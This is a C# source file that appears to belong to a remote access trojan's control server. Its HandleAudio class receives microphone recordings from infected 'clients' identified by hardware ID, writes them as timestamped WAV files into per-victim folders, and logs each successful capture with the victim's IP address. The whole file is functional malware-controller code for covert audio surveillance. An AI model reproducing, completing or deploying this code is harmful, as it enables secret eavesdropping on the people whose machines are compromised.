using Server.Forms;
using Server.MessagePack;
using Server.Connection;
using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using System.Threading;
using System.Threading.Tasks;
using Server.Helper;
using System.Diagnostics;
using System.Collections.Generic;
using System.Linq;

namespace Server.Handle_Packet
{
    public class HandleAudio
    {
        public async void SaveAudio(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                FormAudio audiorecord = (FormAudio)Application.OpenForms["Audio Recorder:" + unpack_msgpack.ForcePathObject("Hwid").GetAsString()];
                if (unpack_msgpack.ForcePathObject("Close").GetAsString() == "true")
                {
                    audiorecord.btnStartStopRecord.Text = "Start Recording";
                    audiorecord.btnStartStopRecord.Enabled = true;
                    client.Disconnected();
                    return;
                }
                else 
                {
                    audiorecord.btnStartStopRecord.Text = "Start Recording";
                    audiorecord.btnStartStopRecord.Enabled = true;

                    string fullPath = Path.Combine(Application.StartupPath, "ClientsFolder", unpack_msgpack.ForcePathObject("Hwid").AsString, "SaveAudio");
                    if (!Directory.Exists(fullPath))
                        Directory.CreateDirectory(fullPath);
                    await Task.Run(() =>
                    {
                        byte[] zipFile = unpack_msgpack.ForcePathObject("WavFile").GetAsBytes();
                        File.WriteAllBytes(fullPath + "//" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".wav", zipFile);
                    });
                    new HandleLogs().Addmsg($"Client {client.Ip} recording success，file located @ ClientsFolder/{unpack_msgpack.ForcePathObject("Hwid").AsString}/SaveAudio", Color.Purple);
                    client.Disconnected();
                }
            }
            catch (Exception ex)
            {
                new HandleLogs().Addmsg($"Save recorded file fail {ex.Message}", Color.Red);
            }
        }
    }
}
